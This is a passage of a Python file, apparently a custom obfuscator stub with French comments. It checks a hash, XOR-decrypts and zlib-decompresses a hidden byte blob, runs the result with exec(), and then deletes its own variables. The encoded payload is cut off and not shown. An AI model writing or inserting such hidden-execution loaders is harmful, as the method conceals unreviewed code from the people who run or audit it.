_cgKvF5AJU7qTd4)
if __import__('hashlib').sha256(_pycSAs05DZnYKE).hexdigest() != '50dd9547bcf0fabc84fe3bd9467f5750d78c800f4614104fb28a08edbcedf15f':
    __import__('sys').exit(1)
_xlFTvSEwhPACzH = bytes([156, 150, 103, 76, 228, 202, 186, 14, 13, 130, 61, 204])
_fkxrOt9wTJpWWGC = bytes([131, 207, 18, 94, 71, 163, 128, 187, 181, 245, 67, 109])

def _fxzhSuBqpyhw95Q(_bh60VC8okx1eJA, _kihxFqGUX6CEnf):
    return bytes(_bh60VC8okx1eJA[_ige9VzRz97wAmK] ^ _kihxFqGUX6CEnf[_ige9VzRz97wAmK % len(_kihxFqGUX6CEnf)] for _ige9VzRz97wAmK in range(len(_bh60VC8okx1eJA)))

def _fdt5p3xAYSX2gIe(_ti7rdL3wjPnn7S):
    import zlib
    return zlib.decompress(_ti7rdL3wjPnn7S) # Un seul niveau de zlib ici pour simplifier

def _fewk6NXn8_46MBJ():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xtRWDwIjpOlinR = _fxzhSuBqpyhw95Q(_pycSAs05DZnYKE, _xlFTvSEwhPACzH)
    # 2. Décompression Zlib
    _dc1QWRCSUOR7pB = _fdt5p3xAYSX2gIe(_xtRWDwIjpOlinR)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dc1QWRCSUOR7pB.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nkwfOU4sumyMc6 = _main.__dict__
    _nkwfOU4sumyMc6.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nkwfOU4sumyMc6)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fewk6NXn8_46MBJ()
try:
    del _fxzhSuBqpyhw95Q, _fdt5p3xAYSX2gIe, _fewk6NXn8_46MBJ
    del _pycSAs05DZnYKE, _xlFTvSEwhPACzH, _fkxrOt9wTJpWWGC
except:
    pass
